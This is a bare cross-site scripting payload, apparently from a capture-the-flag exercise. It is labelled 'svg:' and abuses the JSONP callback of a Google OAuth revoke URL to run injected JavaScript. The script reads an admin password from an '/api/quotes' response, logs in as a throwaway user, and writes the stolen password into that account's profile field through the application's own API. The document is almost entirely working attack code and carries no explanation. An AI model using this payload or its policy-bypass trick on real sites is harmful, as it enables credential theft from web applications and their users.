svg:
<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/quotes')
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_PASSWORD = data.data.password;
                        fetch('/api/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'x',
                                password: 'x' 
                            })
                        })
                        .then(function (res) { 
                            const formData = new FormData();
                            formData.append('about', ADMIN_PASSWORD);
                            fetch('/api/quotes', {
                                method: 'PUT',
                                body: formData
                            })
                        })
                    } 
                });"></script>
